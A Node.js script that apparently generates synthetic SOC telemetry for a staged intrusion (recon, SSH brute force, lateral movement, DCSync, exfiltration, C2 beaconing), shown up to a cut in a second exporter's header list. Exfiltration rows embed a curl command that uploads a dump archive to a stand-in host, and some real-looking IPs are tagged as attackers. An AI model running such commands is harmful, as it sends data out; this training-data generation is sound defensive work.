#!/usr/bin/env node
// Realistic SOC telemetry data generator
// Scenario: External recon → VPN compromise → lateral movement → DCSync → exfiltration → C2 beaconing

import { writeFileSync } from 'fs';
import { join, dirname } from 'path';
import { fileURLToPath } from 'url';

const __dirname = dirname(fileURLToPath(import.meta.url));
const DATA_DIR = join(__dirname, '../data');

// ── helpers ──────────────────────────────────────────────────────────────────
const pad = (n, l = 2) => String(n).padStart(l, '0');
const ts = (base, offsetMin, offsetSec = 0) => {
  const d = new Date(base.getTime() + offsetMin * 60000 + offsetSec * 1000);
  return d.toISOString();
};
const rand = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;
const pick = arr => arr[Math.floor(Math.random() * arr.length)];
const mac = (prefix) => prefix + ':' + [0, 1, 2].map(() => pad(rand(0, 255).toString(16), 2)).join(':');
const escapeCsv = v => {
  if (v === null || v === undefined) return '';
  const s = String(v);
  if (s.includes(',') || s.includes('"') || s.includes('\n')) return '"' + s.replace(/"/g, '""') + '"';
  return s;
};
const row = cols => cols.map(escapeCsv).join(',');

// ── topology ──────────────────────────────────────────────────────────────────
const BASE = new Date('2026-06-10T06:00:00.000Z');

const HOSTS = {
  // Finance workstations
  'ws-finance-21': { ip: '10.10.10.21', mac: 'AA:BB:CC:10:21:01', country: 'US', asn: '64512', os: 'Windows 11', type: 'Workstation', vlan: 10 },
  'ws-finance-22': { ip: '10.10.10.22', mac: 'AA:BB:CC:10:22:01', country: 'US', asn: '64512', os: 'Windows 11', type: 'Workstation', vlan: 10 },
  'ws-finance-23': { ip: '10.10.10.23', mac: 'AA:BB:CC:10:23:01', country: 'US', asn: '64512', os: 'Windows 10', type: 'Workstation', vlan: 10 },
  'ws-finance-24': { ip: '10.10.10.24', mac: 'AA:BB:CC:10:24:01', country: 'US', asn: '64512', os: 'Windows 11', type: 'Workstation', vlan: 10 },
  'ws-finance-25': { ip: '10.10.10.25', mac: 'AA:BB:CC:10:25:01', country: 'US', asn: '64512', os: 'Windows 10', type: 'Workstation', vlan: 10 },
  // HR workstations
  'ws-hr-31':      { ip: '10.10.10.31', mac: 'AA:BB:CC:10:31:01', country: 'US', asn: '64512', os: 'Windows 11', type: 'Workstation', vlan: 10 },
  'ws-hr-32':      { ip: '10.10.10.32', mac: 'AA:BB:CC:10:32:01', country: 'US', asn: '64512', os: 'Windows 10', type: 'Workstation', vlan: 10 },
  // Engineering
  'eng-ws-44':     { ip: '10.10.30.44', mac: 'CC:DD:EE:30:44:01', country: 'US', asn: '64520', os: 'Ubuntu 22.04', type: 'Workstation', vlan: 30 },
  'eng-ws-45':     { ip: '10.10.30.45', mac: 'CC:DD:EE:30:45:01', country: 'US', asn: '64520', os: 'Ubuntu 22.04', type: 'Workstation', vlan: 30 },
  'eng-ws-46':     { ip: '10.10.30.46', mac: 'CC:DD:EE:30:46:01', country: 'US', asn: '64520', os: 'macOS 14', type: 'Workstation', vlan: 30 },
  // Servers
  'fs-payroll-01': { ip: '10.10.20.12', mac: '00:50:56:B2:20:12', country: 'US', asn: '64530', os: 'Windows Server 2022', type: 'File_Server', vlan: 20 },
  'fs-hr-02':      { ip: '10.10.20.13', mac: '00:50:56:B2:20:13', country: 'US', asn: '64530', os: 'Windows Server 2019', type: 'File_Server', vlan: 20 },
  'db-finance-03': { ip: '10.10.20.14', mac: '00:50:56:B2:20:14', country: 'US', asn: '64530', os: 'Windows Server 2022', type: 'Database_Server', vlan: 20 },
  'app-erp-04':    { ip: '10.10.20.10', mac: '00:50:56:B2:20:10', country: 'US', asn: '64530', os: 'RHEL 9', type: 'App_Server', vlan: 20 },
  'app-crm-05':    { ip: '10.10.20.11', mac: '00:50:56:B2:20:11', country: 'US', asn: '64530', os: 'RHEL 9', type: 'App_Server', vlan: 20 },
  // Ops / Jump
  'ops-jump-55':   { ip: '10.10.40.55', mac: '00:50:56:E5:40:55', country: 'US', asn: '64540', os: 'Ubuntu 22.04', type: 'Jump_Host', vlan: 40 },
  'ops-jump-56':   { ip: '10.10.40.56', mac: '00:50:56:E5:40:56', country: 'US', asn: '64540', os: 'Windows Server 2019', type: 'Jump_Host', vlan: 40 },
  // Lab
  'lab-host-61':   { ip: '10.10.50.61', mac: 'BB:CC:DD:50:61:01', country: 'US', asn: '64550', os: 'Ubuntu 22.04', type: 'Lab_Host', vlan: 50 },
  'lab-host-62':   { ip: '10.10.50.62', mac: 'BB:CC:DD:50:62:01', country: 'US', asn: '64550', os: 'Windows 10', type: 'Lab_Host', vlan: 50 },
  // Domain Controllers
  'dc-primary-01': { ip: '10.10.60.100', mac: '00:50:56:BB:60:01', country: 'US', asn: '64560', os: 'Windows Server 2022', type: 'Domain_Controller', vlan: 60 },
  'dc-secondary-02':{ ip: '10.10.60.101', mac: '00:50:56:BB:60:02', country: 'US', asn: '64560', os: 'Windows Server 2019', type: 'Domain_Controller', vlan: 60 },
  // Network
  'sw-dist-01':    { ip: '10.10.70.1',  mac: '00:1A:A2:70:01:01', country: 'US', asn: '64570', os: 'IOS-XE 17.9', type: 'Network_Switch', vlan: 70 },
  'sw-dist-02':    { ip: '10.10.70.2',  mac: '00:1A:A2:70:02:01', country: 'US', asn: '64570', os: 'IOS-XE 17.9', type: 'Network_Switch', vlan: 70 },
  'rtr-core-01':   { ip: '10.10.70.10', mac: '00:1A:A2:70:10:01', country: 'US', asn: '64570', os: 'IOS-XR 7.9', type: 'Router', vlan: 70 },
  'fw-edge-01':    { ip: '10.10.70.20', mac: '00:1A:A2:70:20:01', country: 'US', asn: '64570', os: 'ASA 9.18', type: 'Firewall', vlan: 70 },
  // ISE NAD
  'ise-nad-01':    { ip: '10.10.80.1',  mac: '00:2B:3C:80:01:01', country: 'US', asn: '64580', os: 'ISE 3.2', type: 'NAD', vlan: 80 },
  'ise-nad-02':    { ip: '10.10.80.2',  mac: '00:2B:3C:80:02:01', country: 'US', asn: '64580', os: 'ISE 3.2', type: 'NAD', vlan: 80 },
};

const USERS = {
  'ws-finance-21': 'jdavis@corp.local',
  'ws-finance-22': 'mchen@corp.local',
  'ws-finance-23': 'tpatel@corp.local',
  'ws-finance-24': 'kreyes@corp.local',
  'ws-finance-25': 'bwong@corp.local',
  'ws-hr-31':      'scode@corp.local',
  'ws-hr-32':      'lmartinez@corp.local',
  'eng-ws-44':     'roshea@corp.local',
  'eng-ws-45':     'amurphy@corp.local',
  'eng-ws-46':     'nkumar@corp.local',
  'ops-jump-55':   'svc-ops@corp.local',
  'ops-jump-56':   'svc-ops@corp.local',
  'lab-host-61':   'lab.user1@corp.local',
  'lab-host-62':   'lab.user2@corp.local',
};

// External IPs
const EXT = {
  attacker_nl:   { ip: '45.33.32.156',    mac: '00:11:22:33:44:88', hostname: 'shodan-scan-156',   country: 'NL', asn: '16276', lat: 52.3676, lon: 4.9041 },
  attacker_ru:   { ip: '185.220.101.45',  mac: '00:11:22:AB:CD:45', hostname: 'tor-exit-ru-45',    country: 'RU', asn: '60781', lat: 55.7558, lon: 37.6173 },
  attacker_cn:   { ip: '113.204.85.22',   mac: '00:11:22:BC:DE:22', hostname: 'malhost-cn-85',     country: 'CN', asn: '4134',  lat: 39.9042, lon: 116.4074 },
  c2_server:     { ip: '92.63.196.45',    mac: '00:11:22:CD:EF:45', hostname: 'c2-infra-196-45',   country: 'UA', asn: '9002',  lat: 50.4501, lon: 30.5234 },
  exfil_target:  { ip: '104.21.45.22',    mac: '00:11:22:DE:F0:22', hostname: 'upload.bucket-store.io', country: 'US', asn: '13335', lat: 37.7749, lon: -122.4194 },
  o365:          { ip: '52.96.128.45',    mac: '00:50:56:FF:01:01', hostname: 'smtp.office365.com', country: 'US', asn: '8075',  lat: 47.6062, lon: -122.3321 },
  github:        { ip: '140.82.121.4',    mac: '00:50:56:FF:02:01', hostname: 'github.com',         country: 'US', asn: '36459', lat: 37.3382, lon: -121.8863 },
};

// ── QRadar Events ─────────────────────────────────────────────────────────────
function generateQRadar() {
  const headers = [
    'event_id','qid','qid_name','category','severity','credibility','relevance','magnitude',
    'start_time','source_ip','source_port','source_mac','source_hostname','source_country',
    'destination_ip','destination_port','destination_mac','destination_hostname','destination_country',
    'protocol','application','direction','packet_count','byte_count',
    'username','authentication_type','process_name','command_line','filename','md5','sha256',
    'url','domain','dns_query','user_agent','offense_id','risk_score','log_source_name','raw_event'
  ];

  const rows = [];
  let id = 1000;
  const push = (fields) => { rows.push(row([`QR-${id++}`, ...fields])); };

  // Phase 1: Normal morning activity 06:00–06:18
  const normalPairs = [
    { src: 'ws-finance-21', dst: 'fs-payroll-01', port: 445, proto: 'TCP', app: 'SMB', qid: '5000', qname: 'Windows SMB Connection', cat: 'Access', sev: 2, bytes: 8192, pkts: 12 },
    { src: 'ws-finance-22', dst: 'fs-payroll-01', port: 445, proto: 'TCP', app: 'SMB', qid: '5000', qname: 'Windows SMB Connection', cat: 'Access', sev: 2, bytes: 6144, pkts: 8 },
    { src: 'ws-finance-23', dst: 'db-finance-03', port: 1433, proto: 'TCP', app: 'MSSQL', qid: '5001', qname: 'MS-SQL Connection', cat: 'Database', sev: 2, bytes: 4096, pkts: 6 },
    { src: 'ws-hr-31',      dst: 'fs-hr-02',      port: 445, proto: 'TCP', app: 'SMB', qid: '5000', qname: 'Windows SMB Connection', cat: 'Access', sev: 2, bytes: 5120, pkts: 7 },
    { src: 'eng-ws-44',     dst: 'dc-primary-01', port: 389, proto: 'TCP', app: 'LDAP', qid: '5002', qname: 'LDAP Authentication', cat: 'Authentication', sev: 2, bytes: 3200, pkts: 10 },
    { src: 'ws-finance-24', dst: 'app-erp-04',    port: 8443, proto: 'TCP', app: 'HTTPS', qid: '5003', qname: 'HTTPS Application Access', cat: 'Application', sev: 2, bytes: 15360, pkts: 20 },
    { src: 'ws-finance-25', dst: 'app-crm-05',    port: 443, proto: 'TCP', app: 'HTTPS', qid: '5003', qname: 'HTTPS Application Access', cat: 'Application', sev: 2, bytes: 12288, pkts: 16 },
    { src: 'ws-hr-32',      dst: 'app-crm-05',    port: 443, proto: 'TCP', app: 'HTTPS', qid: '5003', qname: 'HTTPS Application Access', cat: 'Application', sev: 2, bytes: 9216, pkts: 12 },
  ];

  normalPairs.forEach((p, i) => {
    const h = HOSTS[p.src]; const d = HOSTS[p.dst];
    const time = ts(BASE, i * 2, rand(0, 55));
    const user = USERS[p.src] || '';
    push([p.qid, p.qname, p.cat, p.sev, 9, 5, p.sev,
      time, h.ip, rand(49152, 65535), h.mac, p.src, h.country,
      d.ip, p.port, d.mac, p.dst, d.country,
      p.proto, p.app, 'OUTBOUND', p.pkts, p.bytes,
      user, 'Kerberos', 'explorer.exe', '', '', '', '',
      '', p.dst, '', 'Windows SMB Client',
      'OFF-3000', rand(5, 18), 'QRadar_Core',
      `${p.qname}: ${p.src} -> ${p.dst} via ${p.app}`
    ]);
  });

  // Auth events
  const authEvents = [
    { src: 'ws-finance-21', user: 'jdavis@corp.local', sev: 2, qid: '5100', qname: 'User Login Success', cat: 'Authentication', auth: 'Kerberos' },
    { src: 'ws-finance-22', user: 'mchen@corp.local', sev: 2, qid: '5100', qname: 'User Login Success', cat: 'Authentication', auth: 'Kerberos' },
    { src: 'ws-finance-23', user: 'tpatel@corp.local', sev: 2, qid: '5100', qname: 'User Login Success', cat: 'Authentication', auth: 'NTLM' },
    { src: 'ws-hr-31',      user: 'scode@corp.local', sev: 2, qid: '5100', qname: 'User Login Success', cat: 'Authentication', auth: 'Kerberos' },
    { src: 'eng-ws-44',     user: 'roshea@corp.local', sev: 2, qid: '5100', qname: 'User Login Success', cat: 'Authentication', auth: 'LDAP' },
  ];
  authEvents.forEach((a, i) => {
    const h = HOSTS[a.src]; const dc = HOSTS['dc-primary-01'];
    const time = ts(BASE, i * 3 + 1);
    push([a.qid, a.qname, a.cat, a.sev, 9, 8, a.sev,
      time, h.ip, rand(49200, 49299), h.mac, a.src, h.country,
      dc.ip, 88, dc.mac, 'dc-primary-01', dc.country,
      'TCP', 'Kerberos', 'INBOUND', 4, 1024,
      a.user, a.auth, 'lsass.exe', '', '', '', '',
      '', 'corp.local', '', '',
      'OFF-3001', rand(3, 12), 'Windows_Security',
      `${a.qname}: ${a.user} from ${a.src}`
    ]);
  });

  // Phase 2: External port scan 06:20–06:30
  const scanTargets = [
    { dst: 'ops-jump-55', port: 22, app: 'SSH', sev: 5 },
    { dst: 'ops-jump-55', port: 3389, app: 'RDP', sev: 5 },
    { dst: 'ops-jump-56', port: 22, app: 'SSH', sev: 5 },
    { dst: 'app-erp-04',  port: 443, app: 'HTTPS', sev: 4 },
    { dst: 'app-crm-05',  port: 80,  app: 'HTTP', sev: 4 },
    { dst: 'fw-edge-01',  port: 443, app: 'HTTPS', sev: 5 },
    { dst: 'fw-edge-01',  port: 8080, app: 'HTTP', sev: 4 },
    { dst: 'ops-jump-55', port: 8443, app: 'HTTPS', sev: 4 },
    { dst: 'db-finance-03', port: 1433, app: 'MSSQL', sev: 7 },
    { dst: 'dc-primary-01', port: 445, app: 'SMB', sev: 7 },
  ];
  scanTargets.forEach((t, i) => {
    const src = EXT.attacker_nl; const dst = HOSTS[t.dst];
    const time = ts(BASE, 20, i * 45);
    push(['5500', 'Port Scan Detected', 'Recon', t.sev, 8, 7, t.sev,
      time, src.ip, rand(49400, 60000), src.mac, src.hostname, src.country,
      dst.ip, t.port, dst.mac, t.dst, dst.country,
      'TCP', t.app, 'INBOUND', rand(1, 3), rand(60, 180),
      '', '', '', '', '', '', '',
      '', '', '', 'Nmap/7.93',
      'OFF-3100', rand(60, 75), 'QRadar_IDS',
      `Reconnaissance: Port scan from ${src.ip} targeting ${t.dst}:${t.port}`
    ]);
  });

  // Phase 3: SSH brute force then success on ops-jump-55 06:32–06:45
  const bruteAttempts = 8;
  for (let i = 0; i < bruteAttempts; i++) {
    const src = EXT.attacker_nl; const dst = HOSTS['ops-jump-55'];
    const time = ts(BASE, 32, i * 60);
    push(['5550', 'SSH Authentication Failure', 'Authentication', 7, 9, 8, 7,
      time, src.ip, rand(52000, 62000), src.mac, src.hostname, src.country,
      dst.ip, 22, dst.mac, 'ops-jump-55', dst.country,
      'TCP', 'SSH', 'INBOUND', 6, 1408,
      `admin`, 'SSH-Password', 'sshd', '', '', '', '',
      '', '', '', 'libssh/0.10.4',
      'OFF-3100', 72 + i, 'Linux_Auth',
      `SSH authentication failed for user admin from ${src.ip} (attempt ${i+1})`
    ]);
  }
  // Successful SSH login
  {
    const src = EXT.attacker_nl; const dst = HOSTS['ops-jump-55'];
    push(['5555', 'SSH Authentication Success - External IP', 'Authentication', 8, 9, 9, 8,
      ts(BASE, 40, 0), src.ip, 53422, src.mac, src.hostname, src.country,
      dst.ip, 22, dst.mac, 'ops-jump-55', dst.country,
      'TCP', 'SSH', 'INBOUND', 8, 2048,
      'svc-ops@corp.local', 'SSH-Key', 'sshd', '', '', '', '',
      '', '', '', 'OpenSSH_8.9p1',
      'OFF-3200', 88, 'Linux_Auth',
      `ALERT: SSH authentication succeeded for svc-ops from EXTERNAL IP ${src.ip} - possible credential compromise`
    ]);
  }

  // Phase 4: Lateral movement from ops-jump-55 06:45–07:30
  const lateralMoves = [
    { dst: 'dc-primary-01', port: 445, app: 'SMB', bytes: 24576, pkts: 32, sev: 7, qname: 'Lateral Movement - SMB Admin Share Access', qid: '5600', cat: 'Lateral_Movement', mins: 45 },
    { dst: 'dc-primary-01', port: 88,  app: 'Kerberos', bytes: 8192, pkts: 14, sev: 7, qname: 'Kerberos TGT Request - Non-Standard Host', qid: '5601', cat: 'Lateral_Movement', mins: 47 },
    { dst: 'dc-primary-01', port: 389, app: 'LDAP', bytes: 51200, pkts: 68, sev: 8, qname: 'LDAP Reconnaissance - Large Query Volume', qid: '5602', cat: 'Reconnaissance', mins: 50 },
    { dst: 'fs-payroll-01', port: 445, app: 'SMB', bytes: 102400, pkts: 128, sev: 8, qname: 'Suspicious SMB Access - Non-Standard User', qid: '5603', cat: 'Lateral_Movement', mins: 55 },
    { dst: 'db-finance-03', port: 1433, app: 'MSSQL', bytes: 35840, pkts: 44, sev: 8, qname: 'Database Access from Jump Host', qid: '5604', cat: 'Lateral_Movement', mins: 62 },
    { dst: 'dc-primary-01', port: 135, app: 'MSRPC', bytes: 16384, pkts: 22, sev: 9, qname: 'DCSync Activity Detected', qid: '5700', cat: 'Credential_Theft', mins: 75 },
    { dst: 'dc-secondary-02', port: 389, app: 'LDAP', bytes: 204800, pkts: 256, sev: 9, qname: 'DCSync - DRSUAPI GetNCChanges', qid: '5701', cat: 'Credential_Theft', mins: 77 },
    { dst: 'fs-hr-02',      port: 445, app: 'SMB', bytes: 524288, pkts: 640, sev: 8, qname: 'Bulk File Access Anomaly', qid: '5800', cat: 'Data_Access', mins: 90 },
  ];
  lateralMoves.forEach((m, i) => {
    const src = HOSTS['ops-jump-55']; const dst = HOSTS[m.dst];
    push([m.qid, m.qname, m.cat, m.sev, 9, 9, m.sev,
      ts(BASE, m.mins), src.ip, rand(52100, 64000), src.mac, 'ops-jump-55', src.country,
      dst.ip, m.port, dst.mac, m.dst, dst.country,
      'TCP', m.app, 'OUTBOUND', m.pkts, m.bytes,
      'svc-ops@corp.local', 'Kerberos', m.app === 'SMB' ? 'smbclient' : 'python3.exe', '', '', '', '',
      '', 'corp.local', '', '',
      'OFF-3200', 78 + i * 3, 'QRadar_Core',
      `${m.qname}: ops-jump-55 -> ${m.dst} [MITRE ${m.cat === 'Credential_Theft' ? 'T1003.006' : 'T1021.002'}]`
    ]);
  });

  // Phase 5: Exfiltration 08:30–09:00
  const exfilEvents = [
    { bytes: 1048576, pkts: 1280, sev: 9, qname: 'Data Exfiltration - Large HTTPS Upload', qid: '5900', mins: 100, url: 'https://upload.bucket-store.io/api/v1/upload' },
    { bytes: 2097152, pkts: 2560, sev: 9, qname: 'Data Exfiltration - Large HTTPS Upload', qid: '5900', mins: 105, url: 'https://upload.bucket-store.io/api/v1/upload' },
    { bytes: 4194304, pkts: 5120, sev: 10, qname: 'Exfiltration - Sustained High-Volume Upload', qid: '5901', mins: 112, url: 'https://upload.bucket-store.io/api/v1/batch' },
    { bytes: 524288,  pkts: 640,  sev: 8,  qname: 'DNS Data Exfiltration Indicator', qid: '5902', mins: 120, url: '' },
  ];
  exfilEvents.forEach((e) => {
    const src = HOSTS['ws-finance-21']; const dst = EXT.exfil_target;
    push([e.qid, e.qname, 'Exfiltration', e.sev, 10, 10, e.sev,
      ts(BASE, e.mins), src.ip, rand(54000, 65000), src.mac, 'ws-finance-21', src.country,
      dst.ip, 443, dst.mac, dst.hostname, dst.country,
      'TCP', 'HTTPS', 'OUTBOUND', e.pkts, e.bytes,
      'jdavis@corp.local', 'Bearer', 'curl.exe', `curl -X POST ${e.url} -d @/tmp/dump.zip`, 'dump.zip', 'a3f5c1d2e7b8f9a0c1d2e3f4a5b6c7d8', 'sha256:c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2',
      e.url, 'bucket-store.io', '', 'python-requests/2.31.0',
      'OFF-3300', 90 + rand(0, 9), 'QRadar_Core',
      `CRITICAL ${e.qname}: ${src.ip} -> ${dst.ip} [${(e.bytes / 1048576).toFixed(1)}MB] [MITRE T1041]`
    ]);
  });

  // Phase 6: C2 beaconing 09:00+ from ws-finance-21
  for (let i = 0; i < 12; i++) {
    const src = HOSTS['ws-finance-21']; const dst = EXT.c2_server;
    const interval = 300; // 5-min beaconing
    push(['5950', 'C2 Beacon - Regular Interval Communication', 'C2', 9, 9, 10, 9,
      ts(BASE, 130 + i * 5, rand(0, 30)), src.ip, rand(54000, 65000), src.mac, 'ws-finance-21', src.country,
      dst.ip, 443, dst.mac, dst.hostname, dst.country,
      'TCP', 'HTTPS', 'OUTBOUND', rand(3, 8), rand(512, 2048),
      'jdavis@corp.local', '', 'svchost.exe', 'svchost.exe -k netsvcs -p -s Schedule', '', '', '',
      `https://c2-infra-196-45/beacon`, 'c2-infra-196-45', '', 'Mozilla/5.0 (compatible; MSIE 9.0)',
      'OFF-3400', 92 + i, 'QRadar_Core',
      `C2 Beacon #{${i+1}} ws-finance-21 -> ${dst.ip}:443 interval=${interval}s jitter=±${rand(5, 30)}s [MITRE T1071.001]`
    ]);
  }

  // Fill remaining rows with misc auth / network events (~30 more)
  const miscEvents = [
    { src: 'ws-finance-22', dst: 'dc-primary-01', port: 88, proto: 'TCP', app: 'Kerberos', qid: '5100', qname: 'Kerberos Ticket Renewal', cat: 'Authentication', sev: 2, bytes: 1024, pkts: 4, mins: 60 },
    { src: 'ws-finance-23', dst: 'dc-primary-01', port: 88, proto: 'TCP', app: 'Kerberos', qid: '5100', qname: 'Kerberos Ticket Renewal', cat: 'Authentication', sev: 2, bytes: 1024, pkts: 4, mins: 65 },
    { src: 'ws-hr-31',      dst: 'dc-primary-01', port: 88, proto: 'TCP', app: 'Kerberos', qid: '5100', qname: 'Kerberos Ticket Renewal', cat: 'Authentication', sev: 2, bytes: 1024, pkts: 4, mins: 70 },
    { src: 'eng-ws-44',     dst: 'dc-primary-01', port: 636, proto: 'TCP', app: 'LDAPS', qid: '5002', qname: 'LDAP Authentication', cat: 'Authentication', sev: 2, bytes: 3200, pkts: 10, mins: 42 },
    { src: 'eng-ws-45',     dst: 'app-erp-04',    port: 8443, proto: 'TCP', app: 'HTTPS', qid: '5003', qname: 'HTTPS Application Access', cat: 'Application', sev: 2, bytes: 20480, pkts: 26, mins: 44 },
    { src: 'lab-host-61',   dst: 'github.com',    port: 443, proto: 'TCP', app: 'HTTPS', qid: '5003', qname: 'HTTPS Application Access', cat: 'Application', sev: 2, bytes: 10240, pkts: 14, mins: 46 },
    { src: 'ws-finance-24', dst: EXT.o365.hostname, port: 587, proto: 'TCP', app: 'SMTP', qid: '5010', qname: 'SMTP Email Submission', cat: 'Email', sev: 2, bytes: 8192, pkts: 12, mins: 48 },
    { src: 'ws-finance-25', dst: EXT.o365.hostname, port: 587, proto: 'TCP', app: 'SMTP', qid: '5010', qname: 'SMTP Email Submission', cat: 'Email', sev: 2, bytes: 6144, pkts: 8, mins: 50 },
    { src: 'ops-jump-56',   dst: 'dc-primary-01', port: 135, proto: 'TCP', app: 'MSRPC', qid: '5200', qname: 'RPC Service Request', cat: 'Application', sev: 3, bytes: 4096, pkts: 6, mins: 52 },
    { src: 'lab-host-62',   dst: 'dc-primary-01', port: 88,  proto: 'TCP', app: 'Kerberos', qid: '5100', qname: 'User Login Success', cat: 'Authentication', sev: 2, bytes: 1024, pkts: 4, mins: 54 },
    // Windows Event Forwarder events
    { src: 'ws-finance-21', dst: 'dc-primary-01', port: 5985, proto: 'TCP', app: 'WinRM', qid: '5300', qname: 'WinRM Remote Session - Suspicious Host', cat: 'Lateral_Movement', sev: 6, bytes: 16384, pkts: 22, mins: 80 },
    { src: 'ops-jump-55',   dst: 'dc-secondary-02', port: 445, proto: 'TCP', app: 'SMB', qid: '5603', qname: 'Suspicious SMB Access - Non-Standard User', cat: 'Lateral_Movement', sev: 7, bytes: 32768, pkts: 40, mins: 83 },
    { src: 'ws-finance-21', dst: 'db-finance-03', port: 1433, proto: 'TCP', app: 'MSSQL', qid: '5604', qname: 'Database xp_cmdshell Execution', cat: 'Execution', sev: 9, bytes: 4096, pkts: 6, mins: 88 },
    { src: 'ws-finance-21', dst: 'dc-primary-01', port: 88,  proto: 'TCP', app: 'Kerberos', qid: '5102', qname: 'Kerberoasting - SPN Ticket Request', cat: 'Credential_Theft', sev: 9, bytes: 2048, pkts: 8, mins: 82 },
    { src: 'ws-finance-21', dst: 'dc-primary-01', port: 88,  proto: 'TCP', app: 'Kerberos', qid: '5103', qname: 'AS-REP Roasting - Pre-Auth Disabled', cat: 'Credential_Theft', sev: 8, bytes: 1536, pkts: 6, mins: 84 },
    { src: EXT.attacker_cn.ip, dst: 'fw-edge-01', port: 443, proto: 'TCP', app: 'HTTPS', qid: '5500', qname: 'External IP Probing Firewall Interface', cat: 'Recon', sev: 5, bytes: 240, pkts: 2, mins: 18 },
    { src: EXT.attacker_ru.ip, dst: 'ops-jump-55', port: 22,  proto: 'TCP', app: 'SSH', qid: '5550', qname: 'SSH Authentication Failure', cat: 'Authentication', sev: 6, bytes: 1408, pkts: 6, mins: 28 },
    { src: EXT.attacker_ru.ip, dst: 'ops-jump-55', port: 22,  proto: 'TCP', app: 'SSH', qid: '5550', qname: 'SSH Authentication Failure', cat: 'Authentication', sev: 6, bytes: 1408, pkts: 6, mins: 29 },
    { src: 'ws-finance-21', dst: EXT.c2_server.ip, port: 80, proto: 'TCP', app: 'HTTP', qid: '5951', qname: 'C2 HTTP Check-In', cat: 'C2', sev: 8, bytes: 640, pkts: 4, mins: 128 },
    { src: 'ws-finance-22', dst: 'fs-payroll-01', port: 445, proto: 'TCP', app: 'SMB', qid: '5000', qname: 'Windows SMB Connection', cat: 'Access', sev: 2, bytes: 7168, pkts: 10, mins: 35 },
    { src: 'ws-hr-32',      dst: 'fs-hr-02',      port: 445, proto: 'TCP', app: 'SMB', qid: '5000', qname: 'Windows SMB Connection', cat: 'Access', sev: 2, bytes: 5632, pkts: 8, mins: 37 },
    { src: 'eng-ws-46',     dst: 'app-erp-04',    port: 8443, proto: 'TCP', app: 'HTTPS', qid: '5003', qname: 'HTTPS Application Access', cat: 'Application', sev: 2, bytes: 18432, pkts: 24, mins: 39 },
    { src: 'ops-jump-55',   dst: 'ws-finance-21', port: 135, proto: 'TCP', app: 'MSRPC', qid: '5650', qname: 'Remote Process Injection via DCOM', cat: 'Execution', sev: 9, bytes: 16384, pkts: 22, mins: 65 },
    { src: 'ws-finance-21', dst: 'rtr-core-01',   port: 161, proto: 'UDP', app: 'SNMP', qid: '5400', qname: 'SNMP Community String Enumeration', cat: 'Recon', sev: 5, bytes: 512, pkts: 6, mins: 95 },
    { src: 'ws-finance-21', dst: 'sw-dist-01',    port: 23, proto: 'TCP', app: 'Telnet', qid: '5401', qname: 'Telnet Network Device Access', cat: 'Recon', sev: 6, bytes: 1024, pkts: 12, mins: 97 },
    { src: EXT.attacker_nl.ip, dst: 'ops-jump-56', port: 3389, proto: 'TCP', app: 'RDP', qid: '5500', qname: 'External RDP Connection Attempt', cat: 'Recon', sev: 6, bytes: 360, pkts: 4, mins: 22 },
    { src: 'ops-jump-55',   dst: 'lab-host-61',   port: 22, proto: 'TCP', app: 'SSH', qid: '5600', qname: 'Lateral Movement - Internal SSH', cat: 'Lateral_Movement', sev: 6, bytes: 8192, pkts: 12, mins: 68 },
    { src: 'ws-finance-21', dst: 'dc-primary-01', port: 53, proto: 'UDP', app: 'DNS', qid: '5200', qname: 'High-Volume DNS Query', cat: 'Recon', sev: 5, bytes: 2048, pkts: 32, mins: 118 },
    { src: 'ws-finance-21', dst: EXT.c2_server.ip, port: 8080, proto: 'TCP', app: 'HTTP', qid: '5950', qname: 'C2 Beacon - Regular Interval Communication', cat: 'C2', sev: 9, bytes: 1024, pkts: 6, mins: 152 },
    { src: 'ops-jump-55',   dst: 'fs-payroll-01', port: 445, proto: 'TCP', app: 'SMB', qid: '5801', qname: 'File Staging - Suspicious Archive Creation', cat: 'Collection', sev: 8, bytes: 2097152, pkts: 2560, mins: 96 },
  ];

  miscEvents.forEach((m) => {
    let srcIp, srcMac, srcHostname, srcCountry, dstIp, dstMac, dstHostname, dstCountry;
    if (m.src.startsWith('10.')) {
      const entry = Object.entries(HOSTS).find(([, v]) => v.ip === m.src);
      if (entry) { srcHostname = entry[0]; srcIp = entry[1].ip; srcMac = entry[1].mac; srcCountry = entry[1].country; }
    } else {
      const entry = Object.values(EXT).find(v => v.ip === m.src);
      if (entry) { srcIp = entry.ip; srcMac = entry.mac; srcHostname = entry.hostname; srcCountry = entry.country; }
      else { srcIp = m.src; srcMac = '00:00:00:00:00:00'; srcHostname = m.src; srcCountry = 'UN'; }
    }
    if (m.dst && m.dst.startsWith('10.')) {
      const entry = Object.entries(HOSTS).find(([, v]) => v.ip === m.dst);
      if (entry) { dstHostname = entry[0]; dstIp = entry[1].ip; dstMac = entry[1].mac; dstCountry = entry[1].country; }
    } else if (m.dst) {
      const extEntry = Object.values(EXT).find(v => v.ip === m.dst || v.hostname === m.dst);
      if (extEntry) { dstIp = extEntry.ip; dstMac = extEntry.mac; dstHostname = extEntry.hostname; dstCountry = extEntry.country; }
      else { dstIp = m.dst; dstMac = '00:00:00:00:00:00'; dstHostname = m.dst; dstCountry = 'US'; }
    }
    const user = USERS[srcHostname] || '';
    push([m.qid, m.qname, m.cat, m.sev, 9, 7, m.sev,
      ts(BASE, m.mins || 0, rand(0, 59)), srcIp, rand(49152, 65535), srcMac, srcHostname, srcCountry,
      dstIp, m.port, dstMac, dstHostname, dstCountry,
      m.proto, m.app, 'OUTBOUND', m.pkts, m.bytes,
      user, 'Kerberos', 'explorer.exe', '', '', '', '',
      '', dstHostname, '', '',
      'OFF-3200', rand(5, 95), 'QRadar_Core',
      `${m.qname}: ${srcHostname || srcIp} -> ${dstHostname || dstIp}`
    ]);
  });

  return [headers.join(','), ...rows].join('\n');
}

// ── Cisco StealthWatch (SNA) ───────────────────────────────────────────────────
function generateSNA() {
  // Exact column headers from real Cisco StealthWatch (SNA) flow export
  const headers = [
    'Flow ID','Domain','Start','End','Duration','Flow Action',
    'Subject ASN','Subject ASN Assignment','Subject Byte Ratio',
    'Subject IP Address','Subject Hostname','Subject MAC Address','Subject MAC Vendor',
    'Subject NAT','Subject NAT Hostname','Subject NAT Port',
    'Subject Orientation','Subject Port/Protocol',
    'Subject Host Groups','Subject Location','Subject User',
    'Subject Bytes','Subject Byte Rate','Subject Interfaces',
    'Subject Packets','Subject Packet Rate','Subject Payload',
    'Subject Process Account','Subject Process Name','Subject File Hash',
    'Subject Parent Process Name','Subject Parent File Hash',
